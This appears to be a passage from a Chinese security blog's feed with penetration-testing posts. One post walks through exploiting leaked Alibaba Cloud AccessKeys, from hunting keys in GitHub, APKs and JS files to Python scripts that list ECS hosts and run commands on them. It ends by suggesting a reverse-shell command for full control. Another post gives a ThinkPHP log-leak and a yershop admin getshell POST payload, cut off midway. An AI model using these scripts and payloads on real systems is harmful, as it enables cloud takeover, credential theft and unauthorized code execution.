e9526a3f4d7c33a6c29cbe798a283a238d666bde09218b8b9f36cabdb0b2e0a5af79c4cc3dc699d588dd61dec7ec3ccab4696bff98f7971ac0277e79926dc1d8bfe0809c5f61df39ab9ceaa23936d57865b127393795efd7e3e73cba765b3db5681cf94196a3331c9a513aa66a33777f96f8efa32747f741280c44072dffe6d9e09f159cc1b820b08f565493317bf6ebfd35e9a1a517949fb1008496ffe3e3e29ff570bc393b4d63a12dd49d22bbd853cea348f496d38894a9064b7b02f32d9a120ff97391f4aad8b022e772053fa977900046ad3b733b0a3698983d6bfa47e0e9ca958d0c2ad53421fc2950a94ad24f387d90d11272f077ac130f2c2e0274040c46bd96f71ddbf515339eea1a83f0c55b8cf258641451af6decfcfcd4e6b2eb3ea9ee7200726969d40bb39d32f9391c73ccfd75fa315d7e82383c504a646c69fb9e962190c15149c1a33d2d5aaaccb40bb3a5bc04022dde8ff68afec9a044261dee844cad70677db6f606c5820c8215bddf183cd64e2ee920b1f8f809a3ef23e809f5c4ea9551334049d1181211cc34999e98b5d401d28a3a67de9a3f35614bba5d021b059c85558a68d51b68dfe77eec5d331f6c334a492d08c52d188c1cca7d04099d077b40077378642a59bd4d203334611cf839f266d32b7dff98d84e1b95ef5340c0eb250619f15a061289d92d78e512c5ffef76edea6811c7141201e5fa4095dc55c9f8e67efb03314d4cc150186ac87cc578b6a09a106c5df39f903b60d15e11b4e50eb3447d12c2cd24a6962518a99faf5efc7cf8c94ff0c35550cacd0a83fbdda8f4048426c5c3a39f9fcd1c510dfd82ddb5fbd8b3c8a2af3739398c54d86f26613130f7db479b751a64616f96ae53aebb0a3e64a2f06a3384ac9babf96d7717d16171eac4b3e2c2cf1a639f523bff8b1faf766e99187e6eedb90d804b56b66eb3e9d41b07d5fb57c6818762b4c2bfe43377599984c2070404977421fe29fe0f12696276aa6732fe32093e2dd003de43995ac69356e977eb782c76550852d950608e55a476d48a3a2a16cd7d6dd0d5683a293fd2675fa60a90f4690e65175a67f99bf7b4c7e2db453401bf35366cd3c3158bfdc63fc31523ecb974ef4dcdb693db429c6a117f5cedd78bd2d8ee5c7a04738ebe76f45e2529ed9127f202cbf08384bed9640494f59d631f97c9fe6a26b385fa64422bb7ba452d7348bb670bf837f12092a66b4</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      密码
    
    </summary>
    
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>阿里云AccessKey泄露的利用</title>
    <link href="http://yoursite.com/2020/09/01/%E9%98%BF%E9%87%8C%E4%BA%91AccessKey%E6%B3%84%E9%9C%B2%E7%9A%84%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2020/09/01/%E9%98%BF%E9%87%8C%E4%BA%91AccessKey%E6%B3%84%E9%9C%B2%E7%9A%84%E5%88%A9%E7%94%A8/</id>
    <published>2020-08-31T16:00:00.000Z</published>
    <updated>2020-09-02T04:08:05.151Z</updated>
    
    <content type="html"><![CDATA[<p>在渗透测试非法网站中，很多站都是在阿里云，亚马逊云搭建的站点。而阿里云AccessKey的泄露根用户权限大可以直接接管ECS，AWS则是有限制的，不是根用户是通过IAM来创建的用户，访问S3，EC2是分了权限控制的。在渗透测试中获取AccessKey的思路：github泄露，apk反编译泄露key，比较低权限的webshell，js文件，fofa查找。</p><h4 id="工具利用"><a href="#工具利用" class="headerlink" title="工具利用"></a><strong>工具利用</strong></h4><p>利用<a href="https://github.com/aliyun/oss-browser/blob/master/all-releases.md?spm=a2c63.p38356.879954.6.745223c9XFlufA&file=all-releases.md" target="_blank" rel="noopener">OSS Browser</a> 获取oss上面的数据</p><div align="left"><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/1.png" loading="lazy"></div><p>利用<a href="https://yun.cloudbility.com/" target="_blank" rel="noopener">行云管家</a>获取云主机列表，行云管家可以重置ECS的密码（千万别这样做）</p><div align="left"><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/2.png" loading="lazy"></div><h4 id="OpenAPI-Explorer"><a href="#OpenAPI-Explorer" class="headerlink" title="OpenAPI Explorer"></a><strong>OpenAPI Explorer</strong></h4><p>python导入模块(python2的环境)</p><pre><code>pip install oss2pip install aliyun-python-sdk-ecs </code></pre><ol><li>利用DescribeInstances获取某个区域的云主机列表（DescribeInstances.py）</li></ol><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/3.png" alt="" loading="lazy"></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>client <span class="token keyword">import</span> AcsClient<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ClientException<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ServerException<span class="token keyword">from</span> aliyunsdkecs<span class="token punctuation">.</span>request<span class="token punctuation">.</span>v20140526<span class="token punctuation">.</span>DescribeInstancesRequest <span class="token keyword">import</span> DescribeInstancesRequestclient <span class="token operator">=</span> AcsClient<span class="token punctuation">(</span><span class="token string">'&lt;accessKeyId>'</span><span class="token punctuation">,</span> <span class="token string">'&lt;accessSecret>'</span><span class="token punctuation">,</span> <span class="token string">'cn-shanghai'</span><span class="token punctuation">)</span>request <span class="token operator">=</span> DescribeInstancesRequest<span class="token punctuation">(</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_accept_format<span class="token punctuation">(</span><span class="token string">'json'</span><span class="token punctuation">)</span>response <span class="token operator">=</span> client<span class="token punctuation">.</span>do_action_with_exception<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>脚本会输出该区域的公网内网IP，主机名称，InstanceId等等。批量获取所以区域的主机信息(主机名称，操作系统，内网IP，公网IP，区域，InstanceId)，InstanceId在后面的命令执行需要。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">import</span> json<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>client <span class="token keyword">import</span> AcsClient<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ClientException<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ServerException<span class="token keyword">from</span> aliyunsdkecs<span class="token punctuation">.</span>request<span class="token punctuation">.</span>v20140526<span class="token punctuation">.</span>DescribeInstancesRequest <span class="token keyword">import</span> DescribeInstancesRequestRegionIdes <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'华东1（杭州）'</span><span class="token punctuation">:</span><span class="token string">'cn-hangzhou'</span><span class="token punctuation">,</span>    <span class="token string">'华东2（上海）'</span><span class="token punctuation">:</span><span class="token string">'cn-shanghai'</span><span class="token punctuation">,</span>    <span class="token string">'华东 2 金融云'</span><span class="token punctuation">:</span><span class="token string">'cn-shanghai-finance-1'</span><span class="token punctuation">,</span>    <span class="token string">'华北1（青岛）'</span><span class="token punctuation">:</span><span class="token string">'cn-qingdao'</span><span class="token punctuation">,</span>    <span class="token string">'华北2（北京）'</span><span class="token punctuation">:</span><span class="token string">'cn-beijing'</span><span class="token punctuation">,</span>    <span class="token string">'华北3（张家口）'</span><span class="token punctuation">:</span><span class="token string">'cn-zhangjiakou'</span><span class="token punctuation">,</span>    <span class="token string">'华北5（呼和浩特）'</span><span class="token punctuation">:</span><span class="token string">'cn-huhehaote'</span><span class="token punctuation">,</span>    <span class="token string">'华北6（乌兰察布 ）'</span><span class="token punctuation">:</span><span class="token string">'cn-wulanchabu'</span><span class="token punctuation">,</span>    <span class="token string">'华北 2 阿里政务云1'</span><span class="token punctuation">:</span><span class="token string">'cn-north-2-gov-1'</span><span class="token punctuation">,</span>    <span class="token string">'华南1（深圳）'</span><span class="token punctuation">:</span><span class="token string">'cn-shenzhen'</span><span class="token punctuation">,</span>    <span class="token string">'华南 1 金融云'</span><span class="token punctuation">:</span><span class="token string">'cn-shenzhen-finance-1'</span><span class="token punctuation">,</span>    <span class="token string">'华南2（河源）'</span><span class="token punctuation">:</span><span class="token string">'cn-heyuan'</span><span class="token punctuation">,</span>    <span class="token string">'西南1（成都）'</span><span class="token punctuation">:</span><span class="token string">'cn-chengdu'</span><span class="token punctuation">,</span>    <span class="token string">'中国（香港）'</span><span class="token punctuation">:</span><span class="token string">'cn-hongkong'</span><span class="token punctuation">,</span>    <span class="token string">'新加坡'</span><span class="token punctuation">:</span><span class="token string">'ap-southeast-1'</span><span class="token punctuation">,</span>    <span class="token string">'澳大利亚（悉尼）'</span><span class="token punctuation">:</span><span class="token string">'ap-southeast-2'</span><span class="token punctuation">,</span>    <span class="token string">'马来西亚（吉隆坡）'</span><span class="token punctuation">:</span><span class="token string">'ap-southeast-3'</span><span class="token punctuation">,</span>    <span class="token string">'印度尼西亚（雅加达）'</span><span class="token punctuation">:</span><span class="token string">'ap-southeast-5'</span><span class="token punctuation">,</span>    <span class="token string">'日本（东京）'</span><span class="token punctuation">:</span><span class="token string">'ap-northeast-1'</span><span class="token punctuation">,</span>    <span class="token string">'印度（孟买）'</span><span class="token punctuation">:</span><span class="token string">'ap-south-1'</span><span class="token punctuation">,</span>    <span class="token string">'德国（法兰克福）'</span><span class="token punctuation">:</span><span class="token string">'eu-central-1'</span><span class="token punctuation">,</span>    <span class="token string">'英国（伦敦）'</span><span class="token punctuation">:</span><span class="token string">'eu-west-1'</span><span class="token punctuation">,</span>    <span class="token string">'美国（硅谷）'</span><span class="token punctuation">:</span><span class="token string">'us-west-1'</span><span class="token punctuation">,</span>    <span class="token string">'美国（弗吉尼亚）'</span><span class="token punctuation">:</span><span class="token string">'us-east-1'</span><span class="token punctuation">,</span>    <span class="token string">'阿联酋（迪拜）'</span><span class="token punctuation">:</span><span class="token string">'me-east-1'</span><span class="token punctuation">}</span><span class="token keyword">for</span> RegionId <span class="token keyword">in</span> RegionIdes<span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 填入AccessKey ID 和 AccessKey Secret </span>    client <span class="token operator">=</span> AcsClient<span class="token punctuation">(</span><span class="token string">'LTxxxxx'</span><span class="token punctuation">,</span> <span class="token string">'Xxxxxxxxxx'</span><span class="token punctuation">,</span> RegionIdes<span class="token punctuation">[</span>RegionId<span class="token punctuation">]</span><span class="token punctuation">)</span>    request <span class="token operator">=</span> DescribeInstancesRequest<span class="token punctuation">(</span><span class="token punctuation">)</span>    request<span class="token punctuation">.</span>set_accept_format<span class="token punctuation">(</span><span class="token string">'json'</span><span class="token punctuation">)</span>    response <span class="token operator">=</span> client<span class="token punctuation">.</span>do_action_with_exception<span class="token punctuation">(</span>request<span class="token punctuation">)</span>    response <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>response<span class="token punctuation">)</span>    <span class="token keyword">if</span> response<span class="token punctuation">[</span><span class="token string">'Instances'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'Instance'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">for</span> Instance <span class="token keyword">in</span> response<span class="token punctuation">[</span><span class="token string">'Instances'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'Instance'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> Instance<span class="token punctuation">[</span><span class="token string">'VpcAttributes'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                priip <span class="token operator">=</span> Instance<span class="token punctuation">[</span><span class="token string">'VpcAttributes'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'PrivateIpAddress'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'IpAddress'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>            priip <span class="token operator">=</span> <span class="token string">'无'</span>        <span class="token keyword">if</span> Instance<span class="token punctuation">[</span><span class="token string">'PublicIpAddress'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                pubip <span class="token operator">=</span> Instance<span class="token punctuation">[</span><span class="token string">'PublicIpAddress'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'IpAddress'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>                pubip <span class="token operator">=</span> <span class="token string">'无'</span>        <span class="token keyword">if</span> Instance<span class="token punctuation">[</span><span class="token string">'InstanceName'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            insname <span class="token operator">=</span> Instance<span class="token punctuation">[</span><span class="token string">'InstanceName'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> Instance<span class="token punctuation">[</span><span class="token string">'OSName'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            osname <span class="token operator">=</span> Instance<span class="token punctuation">[</span><span class="token string">'OSName'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> Instance<span class="token punctuation">[</span><span class="token string">'InstanceId'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            insId <span class="token operator">=</span> Instance<span class="token punctuation">[</span><span class="token string">'InstanceId'</span><span class="token punctuation">]</span>        res <span class="token operator">=</span> <span class="token string">'主机名称:{}&lt;--->操作系统:{}&lt;--->内网IP:{}&lt;--->公网IP:{}&lt;--->网络@{}&lt;--->InstanceId:{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>insname<span class="token punctuation">,</span> osname<span class="token punctuation">,</span>str<span class="token punctuation">(</span>priip<span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>pubip<span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>RegionId<span class="token punctuation">)</span><span class="token punctuation">,</span>insId<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span></code></pre><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/4.png" alt="" loading="lazy"></p><ol start="2"><li>使用CreateCommand新建一条云助手命令（CreateCommand.py）</li></ol><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/5.png" alt="" loading="lazy"></p><p>RegionId代表区域；Name为命令名称，支持全字符集，长度不得超过128个字符；</p><p>Type为命令的类型：</p><pre><code>RunBatScript：创建一个在Windows实例中运行的 Bat 脚本。 RunPowerShellScript：创建一个在Windows实例中运行的PowerShell脚本。 RunShellScript：创建一个在Linux实例中运行的Shell脚本。</code></pre><p>CommandContent为需要执行的命令，base64进行传输的，一般不超过16k</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">import</span> base64<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>client <span class="token keyword">import</span> AcsClient<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ClientException<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ServerException<span class="token keyword">from</span> aliyunsdkecs<span class="token punctuation">.</span>request<span class="token punctuation">.</span>v20140526<span class="token punctuation">.</span>CreateCommandRequest <span class="token keyword">import</span> CreateCommandRequestclient <span class="token operator">=</span> AcsClient<span class="token punctuation">(</span><span class="token string">'LTxxxxxx'</span><span class="token punctuation">,</span> <span class="token string">'Xxxxxxxxnxxxxxx'</span><span class="token punctuation">,</span> <span class="token string">'cn-hangzhou'</span><span class="token punctuation">)</span>request <span class="token operator">=</span> CreateCommandRequest<span class="token punctuation">(</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_accept_format<span class="token punctuation">(</span><span class="token string">'json'</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_Name<span class="token punctuation">(</span><span class="token string">"test1"</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_Type<span class="token punctuation">(</span><span class="token string">"RunShellScript"</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_CommandContent<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">'需要执行的命令'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>response <span class="token operator">=</span> client<span class="token punctuation">.</span>do_action_with_exception<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>执行脚本输出</p><pre><code>{&quot;RequestId&quot;:&quot;C5A79885-6377-4785-86C6-9CA7FCXXXXX&quot;,&quot;CommandId&quot;:&quot;c-hz0xxxx&quot;}</code></pre><ol start="3"><li>利用DescribeCommands查询您已经创建的云助手命令（DescribeCommands.py）</li></ol><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/6.png" alt="" loading="lazy"></p><p>CommandId为CreateCommand脚本执行返回的结果</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>client <span class="token keyword">import</span> AcsClient<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ClientException<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ServerException<span class="token keyword">from</span> aliyunsdkecs<span class="token punctuation">.</span>request<span class="token punctuation">.</span>v20140526<span class="token punctuation">.</span>DescribeCommandsRequest <span class="token keyword">import</span> DescribeCommandsRequestclient <span class="token operator">=</span> AcsClient<span class="token punctuation">(</span><span class="token string">'&lt;accessKeyId>'</span><span class="token punctuation">,</span> <span class="token string">'&lt;accessSecret>'</span><span class="token punctuation">,</span> <span class="token string">'cn-hangzhou'</span><span class="token punctuation">)</span>request <span class="token operator">=</span> DescribeCommandsRequest<span class="token punctuation">(</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_accept_format<span class="token punctuation">(</span><span class="token string">'json'</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_CommandId<span class="token punctuation">(</span><span class="token string">"c-hz0xxxxx"</span><span class="token punctuation">)</span>response <span class="token operator">=</span> client<span class="token punctuation">.</span>do_action_with_exception<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># python2:  print(response) </span><span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><ol start="4"><li>利用InvokeCommand为一台或多台ECS实例触发一条云助手命令（InvokeCommand.py）</li></ol><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/7.png" alt="" loading="lazy"></p><p>CommandId为CreateCommand脚本执行返回的结果，InstanceId为需要执行命令的实例列表，就是上面第一个脚本获取到的InstanceId</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>client <span class="token keyword">import</span> AcsClient<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ClientException<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ServerException<span class="token keyword">from</span> aliyunsdkecs<span class="token punctuation">.</span>request<span class="token punctuation">.</span>v20140526<span class="token punctuation">.</span>InvokeCommandRequest <span class="token keyword">import</span> InvokeCommandRequestclient <span class="token operator">=</span> AcsClient<span class="token punctuation">(</span><span class="token string">'LTxxxxxx'</span><span class="token punctuation">,</span> <span class="token string">'Xxxxxxxx'</span><span class="token punctuation">,</span> <span class="token string">'cn-hangzhou'</span><span class="token punctuation">)</span>request <span class="token operator">=</span> InvokeCommandRequest<span class="token punctuation">(</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_accept_format<span class="token punctuation">(</span><span class="token string">'json'</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_CommandId<span class="token punctuation">(</span><span class="token string">"c-hz0uxxxxx"</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_InstanceIds<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"i-bp1xxxxxxx"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>response <span class="token operator">=</span> client<span class="token punctuation">.</span>do_action_with_exception<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>只需要将CreateCommand.py脚本的命令换成反弹shell的命令，在利用InvokeCommand执行命令就可以反弹一个最高权限的shell。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在渗透测试非法网站中，很多站都是在阿里云，亚马逊云搭建的站点。而阿里云AccessKey的泄露根用户权限大可以直接接管ECS，AWS则是有限制的，不是根用户是通过IAM来创建的用户，访问S3，EC2是分了权限控制的。在渗透测试中获取AccessKey的思路：github泄露
      
    
    </summary>
    
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>关于ThinkPHP的一些渗透方式</title>
    <link href="http://yoursite.com/2020/08/17/%E5%85%B3%E4%BA%8EThinkPHP%E7%9A%84%E4%B8%80%E4%BA%9B%E6%B8%97%E9%80%8F%E6%96%B9%E5%BC%8F/"/>
    <id>http://yoursite.com/2020/08/17/%E5%85%B3%E4%BA%8EThinkPHP%E7%9A%84%E4%B8%80%E4%BA%9B%E6%B8%97%E9%80%8F%E6%96%B9%E5%BC%8F/</id>
    <published>2020-08-16T16:00:00.000Z</published>
    <updated>2020-08-17T09:29:35.804Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Runtime日志"><a href="#Runtime日志" class="headerlink" title="Runtime日志"></a><strong>Runtime日志</strong></h4><p>在ThinkPHP3的版本中，入口文件index.php是跟应用目录，框架目录是同一个目录下的，在DEBUG开启的状态下，会在runtime生成日志文件，会泄露一些管理员登录后台的账号密码等。tp3的日志文件命名规则为：根目录(或者应用目录)/Runtime/Logs/Admin/20_08_17.log（年份前2位_月份_日.log）</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/1.png" alt="" loading="lazy"></p><p>在tp5的版本中，入口文件index是在public的目录下，它跟应用目录，框架目录不在同一个目录，但是有些管理员会将入口文件放置到跟应用目录，框架目录同目录，tp5的命名规则为：./runtime/log/202008/17.log（./runtime/log/年月/日.log）</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/2.png" alt="" loading="lazy"></p><h4 id="file-put-contents函数"><a href="#file-put-contents函数" class="headerlink" title="file_put_contents函数"></a><strong>file_put_contents函数</strong></h4><p>在thinkphp3中，后台有很多时候都会有写入配置文件来getshell的，所以我总是喜欢全局查找这个file_put_contents这个函数，然后我在网上找了个代码–yershop(TP3开发的那个版本)来进行审计，后台可以通过写入文件来拿shell。全局查找file_put_contents函数，发现控制器AddonsController.class.php中的build存在</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/2/4.png" alt="" loading="lazy"></p><p>发现存在两处写入文件，这里第一处需要满足以下条件：</p><pre><code>$addon_dir可控,$data可控,$addonModel可控</code></pre><p>第二处需要满足：</p><pre><code>$data[&#39;has_config&#39;] == 1,$addon_dir可控</code></pre><p>跟踪发现$data是从全局POST获取的，所有可控，即$addon_dir可控</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/2/5.png" alt="" loading="lazy"></p><p>构造payload如下，后台创建扩展</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/2/6.png" alt="" loading="lazy"></p><p>点击确定，抓包，首先会判断标识名这个插件是否存在，不存在就执行build访问</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/2/7.png" alt="" loading="lazy"></p><p>由于要写入config.php这个文件需要满足$data[‘has_config’] == 1，最后构造payload</p><p>访问：index.php?s=/Admin/Addons/build.html              POST发送：</p><pre><code>info%5Bname%5D=Example&amp;info%5Btitle%5D=%E7%A4%BA%E5%88%97&amp;info%5Bversion%5D=0.1&amp;info%5Bauthor%5D=%E6%97%A0%E5%90%8D&amp;info%5Bdescription%5D=%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E4%B8%B4%E6%97%B6%E6%8F%8F%E8%BF%B0&amp;info%5Bstatus%5D=1&amp;config=%3C%3Fphp%0D%0Areturn+array(%0D%0A%09&#39;random&#39;%3D%3Earray(%2F%2F%E9%85%8D%E7%BD%AE%E5%9C%A8%E8%A1%A8%E5%8D%95%E4%B8%AD%E7%9A%84%E9%94%AE%E5%90%8D+%2C%E8%BF%99%E4%B8%AA%E4%BC%9A%E6%98%AFconfig%5Brandom%5D%0D%0A%09%09&#39;title&#39;%3D%3E&#39;%E6%98%AF%E5%90%A6%E5%BC%80%E5%90%AF%E9%9A%8F%E6%9C%BA%3A&#39;%2C%2F%2F%E8%A1%A8%E5%8D%95%E7%9A%84%E6%96%87%E5%AD%97%0D%0A%09%09&#39;type&#39;%3D%3E&#39;radio&#39;%2C%09%09+%2F%2F%E8%A1%A8%E5%8D%95%E7%9A%84%E7%B1%BB%E5%9E%8B%EF%BC%9Atext%E3%80%81textarea%E3%80%81checkbox%E3%80%81radio%E3%80%81select%E7%AD%89%0D%0A%09%09&#39;options&#39;%3D%3Earray(%09%09+%2F%2Fselect+%E5%92%8Cradion%E3%80%81checkbox%E7%9A%84%E5%AD%90%E9%80%89%E9%A1%B9%0D%0A%09%09%09&#39;1&#39;%3D%3E&#39;%E5%BC%80%E5%90%AF&#39;%2C%09%09+%2F%2F%E5%80%BC%3D%3E%E6%96%87%E5%AD%97%0D%0A%09%09%09&#39;0&#39;%3D%3E&#39;%E5%85%B3%E9%97%AD&#39;%2C%0D%0A%09%09)%2C%0D%0A%09%09&#39;value&#39;%3D%3E&#39;1&#39;%2C%09%09%09+%2F%2F%E8%A1%A8%E5%8D%95%E7%9A%84%E9%BB%98%E8%AE%A4%E5%80%BC%0D%0A%09)%2C%0D%0A)%3B%0D%0A%09%09%09%09%09&amp;custom_config=&amp;admin_list=&#39;model&#39;%3D%3E&#39;Example&#39;%2C%09%09%2F%2F%E8%A6%81%E6%9F%A5%E7%9A%84%E8%A1%A8%0D%0A%09%09%09&#39;fields&#39;%3D%3E&#39;*&#39;%2C%09%09%09%2F%2F%E8%A6%81%E6%9F%A5%E7%9A%84%E5%AD%97%E6%AE%B5%0D%0A%09%09%09&#39;map&#39;%3D%3E&#39;&#39;%2C%09%09%09%09%2F%2F%E6%9F%A5%E8%AF%A2%E6%9D%A1%E4%BB%B6%2C+%E5%A6%82%E6%9E%9C%E9%9C%80%E8%A6%81%E5%8F%AF%E4%BB%A5%E5%86%8D%E6%8F%92%E4%BB%B6%E7%B1%BB%E7%9A%84%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%E9%87%8C%E5%8A%A8%E6%80%81%E9%87%8D%E7%BD%AE%E8%BF%99%E4%B8%AA%E5%B1%9E%E6%80%A7%0D%0A%09%09%09&#39;order&#39;%3D%3E&#39;id+desc&#39;%2C%09%09%2F%2F%E6%8E%92%E5%BA%8F%2C%0D%0A%09%09%09&#39;list_grid&#39;%3D%3Earray(+%09%09%2F%2F%E8%BF%99%E9%87%8C%E5%AE%9A%E4%B9%89%E7%9A%84%E6%98%AF%E9%99%A4%E4%BA%86id%E5%BA%8F%E5%8F%B7%E5%A4%96%E7%9A%84%E8%A1%A8%E6%A0%BC%E9%87%8C%E5%AD%97%E6%AE%B5%E6%98%BE%E7%A4%BA%E7%9A%84%E8%A1%A8%E5%A4%B4%E5%90%8D%E5%92%8C%E6%A8%A1%E5%9E%8B%E4%B8%80%E6%A0%B7%E6%94%AF%E6%8C%81%E5%87%BD%E6%95%B0%E5%92%8C%E9%93%BE%E6%8E%A5%0D%0A++++++++++++++++&#39;cover_id%7Cpreview_pic%3A%E5%B0%81%E9%9D%A2&#39;%2C%0D%0A++++++++++++++++&#39;title%3A%E4%B9%A6%E5%90%8D&#39;%2C%0D%0A++++++++